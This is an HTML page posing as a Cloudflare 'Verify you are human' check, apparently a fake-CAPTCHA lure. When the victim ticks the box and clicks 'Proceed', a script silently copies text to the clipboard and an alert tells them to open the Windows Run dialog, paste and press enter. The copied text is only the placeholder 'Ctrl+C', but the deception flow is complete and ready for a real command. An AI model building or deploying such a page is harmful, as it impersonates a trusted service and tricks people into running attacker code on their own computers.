<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 20px;
            background-color: #f0f0f0;
        }
        .captcha-container {
            width: 350px;
            height: 80px;
            background-color: #fff;
            border: 1px solid #ccc;
            padding: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 18px;
            font-weight: normal;
        }
        .captcha-container input {
            width: 20px;
            height: 20px;
            margin-right: 10px;
        }
        #copyBtn {
            margin-top: 20px;
            padding: 10px;
            cursor: pointer;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
        }
        #copyBtn:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>

    <div class="captcha-container">
        <input type="checkbox" id="captcha-checkbox">
        <label for="captcha-checkbox">Verify you are human</label>
        <div id="cloudflare-logo">
            <img src="Cloudflare.png" alt="Cloudflare" width="80">
        </div>
    </div>

    <button id="copyBtn" style="display: none;">Proceed</button>

    <script>
        document.getElementById('captcha-checkbox').addEventListener('change', function() {
            if (this.checked) {
                document.getElementById('copyBtn').style.display = 'inline-block';
            } else {
                document.getElementById('copyBtn').style.display = 'none';
            }
        });

        document.getElementById('copyBtn').addEventListener('click', function() {
            // Text to be copied to clipboard
            var textToCopy = 'Ctrl+C';

            // Create a temporary textarea element to copy the text
            var tempTextArea = document.createElement('textarea');
            tempTextArea.value = textToCopy;
            document.body.appendChild(tempTextArea);
            tempTextArea.select();
            document.execCommand('copy');
            document.body.removeChild(tempTextArea);

            // Show the alert
            alert('To continue, open the "Run" window using WIN+R, press Ctrl+V, and enter To verify');
        });
    </script>

</body>
</html>
